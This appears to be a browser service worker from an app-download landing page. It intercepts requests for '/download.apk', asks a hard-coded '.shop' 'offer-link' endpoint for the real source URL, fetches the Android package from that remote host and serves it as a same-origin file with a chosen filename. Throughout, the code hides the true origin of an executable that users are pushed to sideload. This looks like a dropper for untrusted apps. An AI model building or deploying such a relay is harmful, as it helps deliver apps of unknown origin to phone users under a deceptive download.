self.addEventListener('install', () => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'SKIP_WAITING') {
    self.skipWaiting();
  }
});

let apkPromise = null;
let apkError = null;
let apkRequestKey = null;
let apkState = null;

const OFFER_LINK_ENDPOINT = 'https://iijjuiu.shop/landers/gitand/offer-link.php';

function delay(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

function sanitizeFileName(value) {
  const fallbackBase = 'download9918';
  const candidate = String(value || '')
    .replace(/\.apk$/i, '')
    .slice(0, 80);
  const isValid = candidate !== ''
    && !/^[ _-]+$/.test(candidate)
    && !/^ /.test(candidate)
    && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
  const base = isValid ? candidate : fallbackBase;
  return `${base}.apk`;
}

function buildErrorResponse(message, status = 502) {
  return new Response(message, {
    status,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      'Cache-Control': 'no-store',
    },
  });
}

function isUsableContentLength(value) {
  const length = Number(value);
  return Number.isSafeInteger(length) && length > 0;
}

function resetApkState() {
  apkPromise = null;
  apkError = null;
  apkRequestKey = null;
  apkState = null;
}

function notifySubscribers(state, method, value) {
  state.subscribers.forEach((subscriber) => {
    try {
      subscriber[method](value);
    } catch (error) {
      console.error('[download] subscriber notification failed', error);
    }
  });
}

async function pumpApkBody(state, response) {
  const reader = response.body.getReader();

  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) {
        state.done = true;
        notifySubscribers(state, 'close');
        state.subscribers.clear();
        return;
      }

      state.chunks.push(value);
      state.bytes += value.byteLength;
      state.chunkCount += 1;
      notifySubscribers(state, 'enqueue', value);
    }
  } catch (error) {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  }
}

function getTemplateValue(params, key) {
  const value = params.get(key);
  if (value !== null) {
    return value;
  }

  if (key === 't2') {
    return params.get('utm_medium') || '';
  }

  if (key === 't3') {
    return params.get('utm_source') || '';
  }

  return '';
}

function fillOfferUrlTemplate(value, params) {
  return value.replace(/\{([A-Za-z0-9_-]+)\}/g, (match, key) => {
    return encodeURIComponent(getTemplateValue(params, key));
  });
}

async function resolveOfferUrl(offerId, params) {
  const endpoint = new URL(OFFER_LINK_ENDPOINT);
  endpoint.searchParams.set('offer_id', offerId);

  const response = await fetch(endpoint.href, {
    method: 'GET',
    mode: 'cors',
    credentials: 'omit',
    redirect: 'follow',
    headers: {
      'Accept': 'application/json',
    },
  });

  if (!response.ok) {
    throw new Error(`offer HTTP ${response.status}`);
  }

  const data = await response.json();
  if (!data || typeof data.url !== 'string' || data.url.trim() === '') {
    throw new Error('offer response url is missing');
  }

  const sourceUrl = new URL(fillOfferUrlTemplate(data.url, params));
  if (!['http:', 'https:'].includes(sourceUrl.protocol)) {
    throw new Error('unsupported offer url protocol');
  }

  return sourceUrl;
}

function createApkState(offerId, params, requestKey) {
  const state = {
    offerId,
    href: null,
    chunks: [],
    subscribers: new Set(),
    done: false,
    error: null,
    contentLength: null,
    contentDisposition: null,
    contentType: 'application/vnd.android.package-archive',
    bytes: 0,
    chunkCount: 0,
  };

  apkState = state;
  apkRequestKey = requestKey;

  apkPromise = (async () => {
    const sourceUrl = await resolveOfferUrl(offerId, params);
    state.href = sourceUrl.href;

    const response = await fetch(sourceUrl.href, {
      method: 'GET',
      mode: 'cors',
      credentials: 'omit',
      redirect: 'follow',
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    const contentLength = response.headers.get('content-length');
    if (isUsableContentLength(contentLength)) {
      state.contentLength = contentLength;
    }

    state.contentType = response.headers.get('content-type') || state.contentType;
    state.contentDisposition = response.headers.get('content-disposition');
    pumpApkBody(state, response).catch((error) => {
      console.error('[download] upstream body read failed', error);
    });

    return state;
  })().catch((error) => {
    state.error = error;
    apkError = error;
    notifySubscribers(state, 'error', error);
    state.subscribers.clear();
    throw error;
  });

  return state;
}

async function getApkState(offerId, params, requestKey) {
  if (apkRequestKey && apkRequestKey !== requestKey) {
    resetApkState();
  }

  if (apkError) {
    throw apkError;
  }

  if (!apkState) {
    createApkState(offerId, params, requestKey);
  }

  await apkPromise;
  return apkState;
}

async function buildDeferredApkResponse(offerId, fileName, params, requestKey) {
  const state = await getApkState(offerId, params, requestKey);
  const headers = new Headers();
  headers.set('Content-Type', state.contentType);
  headers.set('Cache-Control', 'no-store');

  if (state.contentDisposition) {
    headers.set('Content-Disposition', state.contentDisposition);
  } else {
    headers.set('Content-Disposition', `attachment; filename="${fileName}"`);
  }

  if (state.contentLength) {
    headers.set('Content-Length', state.contentLength);
  }

  let subscriber = null;

  const stream = new ReadableStream({
    async start(controller) {
      try {
        await delay(100);

        for (const chunk of state.chunks) {
          controller.enqueue(chunk);
        }

        if (state.error) {
          controller.error(state.error);
          return;
        }

        if (state.done) {
          controller.close();
          return;
        }

        subscriber = {
          enqueue: (chunk) => controller.enqueue(chunk),
          close: () => controller.close(),
          error: (error) => controller.error(error),
        };

        state.subscribers.add(subscriber);
      } catch (error) {
        controller.error(error);
      }
    },
    cancel() {
      if (subscriber) {
        state.subscribers.delete(subscriber);
      }
    },
  });

  return new Response(stream, {
    status: 200,
    statusText: 'OK',
    headers,
  });
}

self.addEventListener('fetch', (event) => {
  const requestUrl = new URL(event.request.url);

  if (!requestUrl.pathname.endsWith('/download.apk')) {
    return;
  }

  event.respondWith((async () => {
    const offerId = requestUrl.searchParams.get('offer_id');
    const fileName = sanitizeFileName(requestUrl.searchParams.get('name'));

    if (!offerId || !offerId.trim()) {
      return buildErrorResponse('Missing offer_id parameter', 400);
    }

    try {
      return await buildDeferredApkResponse(
        offerId.trim().slice(0, 80),
        fileName,
        requestUrl.searchParams,
        requestUrl.search
      );
    } catch (error) {
      return buildErrorResponse(`APK download failed: ${error.message}`, 502);
    }
  })());
});
